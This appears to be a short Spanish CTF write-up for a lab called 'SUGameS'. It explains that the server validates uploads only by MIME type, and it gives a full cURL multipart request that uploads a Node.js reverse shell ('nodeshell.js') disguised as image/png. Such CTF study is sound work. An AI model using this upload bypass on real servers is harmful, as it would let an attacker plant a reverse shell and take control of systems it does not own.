@@ -1,0 +1,45 @@
+## WriteUp segunda flag SUGameS
+
+- Hay que conseguir subir una shell reversa, subiendo un archivo con extensión .js. La vulnerabilidad consiste en que el servidor únicamente comprueba el tipo MIME del archivo, no comprueba la extensión real, con lo que podemos subir un archivo .js cambiando el Content-Type del formulario mediante una petición cURL.
+
+### Windows
+
+- Hemos de leer el contenido del archivo mediante el comando:
+
+```bash
+curl.exe "http://localhost/api/comment/Elden Ring" `
+  -H "Accept: */*" `
+  -H "Accept-Language: es-ES,es" `
+  -H "Connection: keep-alive" `
+  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr9Vj1mU6W8h7sL4Z" `
+  -H "Origin: http://localhost" `
+  -H "Referer: http://localhost/" `
+  -H "Sec-Fetch-Dest: empty" `
+  -H "Sec-Fetch-Mode: cors" `
+  -H "Sec-Fetch-Site: same-origin" `
+  -H "Sec-GPC: 1" `
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" `
+  -H "sec-ch-ua: ^\^"Not A(Brand^\^";v=^\^"99^\^", ^\^"Brave^\^";v=^\^"121^\^", ^\^"Chromium^\^";v=^\^"121^\^"" `
+  -H "sec-ch-ua-mobile: ?0" `
+  -H "sec-ch-ua-platform: ^\^"Windows^\^"" `
+  --data-binary "------WebKitFormBoundaryr9Vj1mU6W8h7sL4Z
+
+Content-Disposition: form-data; name=^\^"game^\^"^
+
+Elden Ring
+
+------WebKitFormBoundaryr9Vj1mU6W8h7sL4Z
+
+Content-Disposition: form-data; name=^\^"text^\^"^
+
+Hola mundo
+
+------WebKitFormBoundaryr9Vj1mU6W8h7sL4Z
+
+Content-Disposition: form-data; name=^\^"image^\^"; filename=^\^"nodeshell.js^\^"^
+
+Content-Type: image/png
+
+" `
+  --data-binary "@D:\Users\ferna\Documents\Ciberseguridad\CTF24\nodeshell.js"` --compressed
+```
